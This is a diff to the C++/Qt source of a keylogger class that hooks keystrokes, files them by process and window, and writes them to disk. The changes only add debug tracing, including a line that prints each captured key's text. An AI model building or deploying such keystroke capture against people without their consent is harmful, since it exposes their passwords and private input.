@@ -37,8 +37,10 @@ void KeyLogger::start()
 {
     try
     {
+        qDebug() << "KEYLOGGER - Starting key hook";
         m_timer.start(5000);
         KeyHook::Instance()->start();
+
     }
     catch(QString error)
     {
@@ -54,6 +56,7 @@ void KeyLogger::stop()
 {
     try
     {
+        qDebug() << "KEYLOGGER - Stopping key hook";
         m_timer.stop();
         KeyHook::Instance()->stop();
     }
@@ -71,6 +74,7 @@ void KeyLogger::setMax(qint64 size)
 {
     try
     {
+        qDebug() << "KEYLOGGER - Setting size";
         if(size < 0) size = 1024 * 500;
         m_limit = size;
     }
@@ -88,6 +92,7 @@ void KeyLogger::setPath(QString path)
 {
     try
     {
+        qDebug() << "KEYLOGGER - Setting the path";
         m_path = path;
         QFileInfo fi(m_path);
 
@@ -116,6 +121,8 @@ void KeyLogger::keyPress(LogEvent *event)
 {
     try
     {
+        qDebug() << "KEYLOGGER - Key press event";
+
         WindowsInfo info;
         LogProcess* process;
 
@@ -149,7 +156,7 @@ void KeyLogger::keyPress(LogEvent *event)
         event->setParent(process);
         process->events.append(event);
 
-        //qDebug() << "Key press: " << event->text;
+        qDebug() << "KEYLOGGER - Key press: " << event->text;
 
         //Set the last handle
         m_lastHandle = currentHandle;
@@ -169,6 +176,8 @@ void KeyLogger::writeLogs()
 {
     try
     {
+         qDebug() << "KEYLOGGER - Checking for log write";
+
         //Write the logs to the disk
         if(processes.count() <= 0) return;
 
@@ -241,6 +250,8 @@ QString KeyLogger::getLogName()
 {
     try
     {
+        qDebug() << "KEYLOGGER - Getting the log name";
+
         //Determine the log file to write to
         QString filename = m_file;
         QFileInfo fi(filename);
